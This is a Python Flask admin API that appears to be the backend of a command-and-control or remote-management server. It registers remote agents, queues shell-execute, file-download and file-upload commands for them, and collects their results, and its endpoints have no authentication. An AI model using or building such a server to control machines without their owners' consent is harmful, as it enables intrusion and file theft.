from flask import Blueprint, request, jsonify
import sqlite3
from datetime import datetime

admin_bp = Blueprint('admin', __name__, url_prefix='/api/admin')

def init_db():
    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()

    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE,
            hostname TEXT DEFAULT '',
            os_arch TEXT DEFAULT '',
            version TEXT DEFAULT '',
            status TEXT DEFAULT 'inactive',
            connected INTEGER DEFAULT 0,
            last_seen TEXT,
            aes_key_encrypted TEXT
        )
    """)

    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS Commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_text TEXT NOT NULL,
            arguments TEXT,
            created_at TEXT,
            status TEXT DEFAULT 'pending',
            command_type TEXT DEFAULT 'execute',   -- execute, download, upload
            file_path TEXT                         -- 
        )
    """)

    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS AgentCommands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id INTEGER,
            command_id INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id),
            FOREIGN KEY(command_id) REFERENCES Commands(id)
        )
    """)

    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS Results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id INTEGER,
            result_data TEXT,
            created_at TEXT
        )
    """)
    cursor.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

init_db()

@admin_bp.route('/commands', methods=['POST'])
def create_command():
    data = request.get_json() or {}
    agent_uuid = data.get('agent_uuid')
    command_type = data.get('command_type', 'execute')  
    command_text = data.get('command_text', '').strip()
    file_path = data.get('file_path', '').strip()
    arguments = data.get('arguments', '')

    if not agent_uuid:
        return jsonify({"status": "error", "message": "agent_uuid Required "}), 400

    
    if command_type == "download":
        command_text = "download"
    elif command_type == "upload":
        command_text = "upload"
    else:
        command_type = "execute"

    if command_type in ("download", "upload") and not file_path:
        return jsonify({"status": "error", "message": "file_path Required for download/upload"}), 400

    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO Commands (command_text, arguments, created_at, status, command_type, file_path)
        VALUES (?, ?, ?, 'pending', ?, ?)
    """, (command_text, arguments, datetime.utcnow().isoformat(), command_type, file_path))

    command_id = cursor.lastrowid

    cursor.execute("SELECT id FROM agents WHERE uuid = ?", (agent_uuid,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        return jsonify({"status": "error", "message": "Agent not a found"}), 404

    agent_id = row[0]
    cursor.execute("INSERT INTO AgentCommands (agent_id, command_id) VALUES (?, ?)", (agent_id, command_id))

    conn.commit()
    conn.close()

    return jsonify({"status": "success", "command_id": command_id}), 201

@admin_bp.route('/commands', methods=['GET'])
def get_all_commands():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        cursor.execute("""
            SELECT id, command_text, arguments, created_at, status, command_type, file_path
            FROM Commands 
            ORDER BY created_at DESC
        """)
        rows = cursor.fetchall()

        command_list = []
        for row in rows:
            command_list.append({
                "id": row[0],
                "command_text": row[1],
                "arguments": row[2] or "",
                "created_at": row[3],
                "status": row[4],
                "command_type": row[5] or "execute",
                "file_path": row[6] or ""
            })

        conn.close()

        return jsonify({
            "status": "success",
            "total": len(command_list),
            "commands": command_list
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@admin_bp.route('/results', methods=['GET'])
def get_all_results():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        cursor.execute("""
            SELECT 
                r.id,
                c.command_text,
                c.arguments,
                c.command_type,
                c.file_path,
                r.result_data,
                r.created_at,
                c.status
            FROM Results r
            LEFT JOIN Commands c ON r.command_id = c.id
            ORDER BY r.created_at DESC
        """)
        rows = cursor.fetchall()

        results_list = []
        for row in rows:
            results_list.append({
                "result_id": row[0],
                "command_text": row[1] or "unknow",
                "arguments": row[2] or "",
                "command_type": row[3] or "execute",
                "file_path": row[4] or "",
                "result_data": row[5] or "",
                "created_at": row[6],
                "command_status": row[7] or "unknow"
            })

        conn.close()

        return jsonify({
            "status": "success",
            "total_results": len(results_list),
            "results": results_list
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@admin_bp.route('/commands/<int:command_id>', methods=['DELETE'])
def delete_command(command_id):
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        cursor.execute("SELECT id FROM Commands WHERE id = ?", (command_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"status": "error", "message": f"command {command_id} Not Found"}), 404

        cursor.execute("DELETE FROM Commands WHERE id = ?", (command_id,))
        conn.commit()
        conn.close()

        return jsonify({"status": "success", "message": f"command {command_id} deleted"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500